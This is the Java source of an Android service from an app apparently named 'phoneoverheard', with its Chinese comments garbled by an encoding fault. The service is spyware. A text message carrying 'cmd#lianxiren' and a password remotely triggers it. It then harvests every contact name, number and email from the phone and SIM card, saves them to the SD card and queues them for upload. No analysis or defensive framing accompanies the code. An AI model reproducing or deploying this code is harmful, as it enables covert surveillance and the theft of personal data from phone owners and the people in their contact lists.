package com.phoneoverheard.phonne;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import com.phoneoverheard.database.Manager;
import com.phoneoverheard.database.ManagerService;
import com.phoneoverheard.database.Sendaudio;
import com.phoneoverheard.database.SendaudioService;
import com.phoneoverheard.database.SmscmdService;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.BaseColumns;
import android.provider.ContactsContract;
import android.provider.ContactsContract.PhoneLookup;
import android.telephony.SmsManager;
import android.util.Log;

@SuppressLint("SimpleDateFormat")
public class lianxirenService extends Service {
    private static final String TAG = "lianxirenService";   
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	final String receiveTime = Dateformat.format(date);
	WriteLog mylog = new WriteLog();
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	
    @Override  
    public void onCreate() {  
        super.onCreate(); 
        Log.i(TAG, "onCreate called.");  
    }
    
    @Override
	public void onDestroy() { 
        Log.i(TAG, "onDestroy called.");
        super.stopSelf();
        super.onDestroy();  
    }  
    
    @Override  
    public int onStartCommand(Intent intent, int flags, int startId) {  
        Log.i(TAG, "onStartCommand called.");  
        return super.onStartCommand(intent, flags, startId);  
    }  
    
    @Override  
    public void onStart(Intent intent, int startId) {  
    	Log.i(TAG, "onStart called."); 
    	mylog.WrLog("i",TAG,"��ʼ��ȡ��ϵ����Ϣ��");
		String filecontext = "";
		String ContectsInfo = "";
		String SIMContectsInfo = "";
        Bundle smscontent = intent.getBundleExtra("smscontent");// ����bundle��key�õ���Ӧ�Ķ���
        String content=smscontent.getString("content");
        String sendernumber=smscontent.getString("sendernumber"); 
        String[] contents = content.split("#");
        SmscmdService smscmdservice = new SmscmdService(getBaseContext());
        String password = smscmdservice.find("lianxiren").getPassword();		
        if(contents[0].equals("cmd") && contents[1].equals("lianxiren") && new FileService().MD5(contents[2]).equals(password)){
			ContectsInfo = readContects(getBaseContext());
			SIMContectsInfo = readSIMContects(getBaseContext());
			filecontext = ContectsInfo+"/n"+SIMContectsInfo;
	    	ManagerService managerservice = new ManagerService(getBaseContext());
	    	Manager manager = managerservice.find("manager");
	    	String filedir = manager.getAudiofolder();
			String fileurl = filedir+"lianxiren"+receiveTime+".txt";
			//������д��SD���ļ���
	        FileService FileService = new FileService();	        
			try {
		    	if(new File(filedir).exists()){
		    		FileService.saveToSDCard(filedir,"lianxiren"+receiveTime+".txt", filecontext,getBaseContext());
		    	}
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			File file = new File(fileurl);
			SendaudioService sendaudioservice = new SendaudioService(getBaseContext());
			Sendaudio sendaudio = new Sendaudio(0,file.length(),receiveTime,fileurl,"lianxiren"+receiveTime+".txt");
			sendaudioservice.insert(sendaudio);
			Log.i(TAG, 0+" "+file.length()+" "+receiveTime+" "+fileurl);
			mylog.WrLog("i",TAG,0+" "+file.length()+" "+receiveTime+" "+fileurl);
			new FileService().CheckConnectInternet(file,getBaseContext());		
		}else{
			// �ƶ���Ӫ������ÿ�η��͵��ֽ��������ޣ����ǿ���ʹ��Android�������ṩ �Ķ��Ź��ߡ�
	        SmsManager sms = SmsManager.getDefault();
	        String ErrMsg = "�������";
	        // �������û�г������Ƴ��ȣ��򷵻�һ�����ȵ�List��
	        List<String> texts = sms.divideMessage(ErrMsg);
	        for (String text : texts) {
	        	sms.sendTextMessage(sendernumber,null,text,null,null);
	        }
		}
		onDestroy();
    } 
	
    /**
     * ������������ȡ�ֻ��е���ϵ����Ϣ
     * @param context Context����
     * @return PhoneContacts �ֻ��е���ϵ����Ϣ
     */
	public String readContects(Context context) {
		mylog.WrLog("i",TAG,"��ȡ�ֻ��е���ϵ����Ϣ");
        String PhoneContacts = null;
        ContentResolver cr = context.getContentResolver();        
        Cursor c_name = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        while (c_name.moveToNext()) {
            //��ȡ��ϵ��ID
            String id = c_name.getString(c_name.getColumnIndex(BaseColumns._ID));
            //��ȡ��ϵ������
            String name = c_name.getString(c_name.getColumnIndex(PhoneLookup.DISPLAY_NAME));
            if(PhoneContacts != null){
            	PhoneContacts += name + " ";
            }else{
            	PhoneContacts = name + " ";
            }
            //��ȡ����ϵ��ID��ͬ�ĵ绰����,���ܲ�ֹһ��
            Cursor c_number = cr.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + id,
                    null, null);
            while (c_number.moveToNext()) {
                String number = c_number
                        .getString(c_number
                                .getColumnIndex(ContactsContract.CommonDataKinds.Phone.DATA1)); 
                PhoneContacts += number + " ";
            }
            c_number.close();
            //��ȡ����ϵ��ID��ͬ�ĵ����ʼ�,���ܲ�ֹһ��
            Cursor c_email = cr.query(
                    ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
                    ContactsContract.CommonDataKinds.Email.CONTACT_ID + "=" + id,
                    null, null);
            while (c_email.moveToNext()) {
                String email = c_email
                        .getString(c_email
                                .getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA1));
                PhoneContacts += email + " ";
            }
            c_email.close();
            PhoneContacts += "\n";
        }
        c_name.close();
        return PhoneContacts;
    }
	
    /**
     * ������������ȡSIM���е���ϵ����Ϣ
     * @param context Context����
     * @return SIMContacts ��ȡSIM�ֻ�������ϵ����Ϣ
     */
	public String readSIMContects(Context context) {
		mylog.WrLog("i",TAG,"��ȡSIM���е���ϵ����Ϣ");
        String SIMContacts = null;
        Uri uri = Uri.parse("content://icc/adn");
        ContentResolver cr = context.getContentResolver();        
        Cursor c_name = cr.query(uri, null, null, null, null);        
        if (c_name != null) {
	        while (c_name.moveToNext()) {
	            //��ȡ��ϵ������
	            //String id = c_name.getString(c_name.getColumnIndex("_id"));	
	            //��ȡ��ϵ������
	            String name = c_name.getString(c_name.getColumnIndex("name"));
	            if(SIMContacts != null){
	            	SIMContacts += name + " ";
	            }else{
	            	SIMContacts = name + " ";
	            }
	            //��ȡ����ϵ��ID��ͬ�ĵ绰����,���ܲ�ֹһ��
	            String number = c_name.getString(c_name.getColumnIndex("number")); 
	            SIMContacts += number + " ";
	            //��ȡ����ϵ��ID��ͬ�ĵ����ʼ�,���ܲ�ֹһ��
	            String email = c_name.getString(c_name.getColumnIndex("emails"));
	            if(email != null){
	            	SIMContacts += email + " ";
	            }
	            SIMContacts += "\n";
	        }
        }else{
        	SIMContacts ="���ܴ�'content://icc/adn'������\n";
        }
        c_name.close();
        return SIMContacts;
    }

}
